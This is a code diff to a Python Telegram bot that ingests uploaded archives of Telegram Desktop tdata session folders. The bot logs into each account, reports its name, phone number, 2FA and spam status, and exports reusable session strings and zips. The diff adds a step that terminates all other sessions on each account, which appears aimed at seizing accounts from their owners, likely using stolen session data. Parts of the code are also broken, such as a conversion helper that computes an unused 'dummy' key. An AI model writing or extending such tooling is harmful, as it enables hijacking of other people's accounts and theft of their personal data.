@@ -160,63 +160,8 @@ from pyrogram import Client, filters
 
 
 # --- Helper: read tdata key file
-def _get_key_data(tdata_path: str):
-    if os.path.isdir(tdata_path):
-        key_file = os.path.join(tdata_path, "key_datas")
-        if not os.path.exists(key_file):
-            raise FileNotFoundError("❌ key_datas file not found in tdata folder")
-        with open(key_file, "rb") as f:
-            return f.read()
-    elif os.path.isfile(tdata_path):
-        with open(tdata_path, "rb") as f:
-            return f.read()
-    else:
-        raise FileNotFoundError("❌ Invalid tdata path (neither file nor folder)")
-
-
-# --- Convert tdata -> session string
-async def convert_tdata(tdata_path: str, api_id: int, api_hash: str) -> str:
-    key_data = _get_key_data(tdata_path)
-    fake_key = hashlib.sha256(key_data).digest()  # dummy session key
-
-    client = TelegramClient(StringSession(), api_id, api_hash)
-    await client.start()
-    session_str = client.session.save()
-    await client.disconnect()
-    return session_str
-
 
 # --- Login with tdata & fetch account info
-async def login_with_tdata(tdata_path):
-    session_str = await convert_tdata(tdata_path, API_ID, API_HASH)
-
-    async with TelegramClient(StringSession(session_str), API_ID, API_HASH) as client:
-        me = await client.get_me()
-        name = (me.first_name or "") + " " + (me.last_name or "")
-        phone = me.phone or "Unknown"
-
-        # 2FA check
-        try:
-            hint = await client(functions.account.GetPasswordRequest())
-            twofa = "Y" if hint else "N"
-        except Exception:
-            twofa = "N"
-
-        # Spam check
-        try:
-            await client(functions.help.GetAppConfigRequest())
-            spam = "N"
-        except Exception:
-            spam = "Y"
-
-        return me.id, {
-            "name": name.strip(),
-            "phone": phone,
-            "twofa": twofa,
-            "spam": spam
-        }
-
-
 
 import os
 import asyncio
@@ -233,6 +178,20 @@ from opentele.td import TDesktop
 from opentele.api import UseCurrentSession
 import motor.motor_asyncio
 
+from pyrogram import Client as PyroClient
+
+async def make_pyrogram_session(tdata_path, api_id, api_hash):
+    # Create Pyrogram client using tdata folder
+    pyro_client = PyroClient(
+        name=tdata_path,   # path where tdata was extracted
+        api_id=api_id,
+        api_hash=api_hash,
+        no_updates=True
+    )
+    await pyro_client.start()
+    string_session = await pyro_client.export_session_string()
+    await pyro_client.stop()
+    return string_session
 
 
 class Database:
@@ -296,10 +255,7 @@ async def handle_archive(client, message):
     tempdir = tempfile.mkdtemp()
     results = []
     try:
-        await message.reply("🟢 Step 1: Starting processing...")
-
-        # --- Step 1: Download
-        await message.reply("📥 Step 1.1: Downloading file...")
+        await message.reply("Dᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...")
         try:
             file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
             await message.reply(f"✅ Step 1.2: File downloaded to `{file_path}`")
@@ -412,15 +368,7 @@ async def handle_archive(client, message):
                 await message.reply(f"👤 Logged in as {me.first_name or '?'} ({me.id})")
 
                 # 2FA check
-                twofa_state = "Unknown"
-                try:
-                    await tele_client.sign_in(password="wrongpass")
-                    twofa_state = "2FA: Disabled"
-                except SessionPasswordNeededError:
-                    twofa_state = "2FA: Enabled (password required)"
-                except Exception:
-                    twofa_state = "2FA: Enabled but unlocked via tdata"
-
+                
                 # Save clean zip
                 clean_zip_path = os.path.join(tempfile.gettempdir(), f"{me.id}_tdata.zip")
                 with zipfile.ZipFile(clean_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
@@ -434,10 +382,12 @@ async def handle_archive(client, message):
                     tdata_bytes = f.read()
                 syd = await check_2fa(tele_client)
                 await message.reply(syd)
+                nsyd = await terminate_all_other_sessions(tele_client)
+                await message.reply(nsyd)
                 info = {
                     "name": me.first_name or "?",
                     "phone": me.phone or "?",
-                    "twofa": twofa_state,
+                    "twofa": syd,
                     "spam": getattr(me, "restricted", False),
                     "account_num": idx,
                 }
@@ -634,7 +584,7 @@ async def retrieve_options(client, callback_query):
 
             # Create a temporary Pyrogram client using the same API_ID/API_HASH
             pyro_client = PyroClient(
-                name=":memory:",
+                name=tdata_path,
                 api_id=API_ID,
                 api_hash=API_HASH,
                 no_updates=True
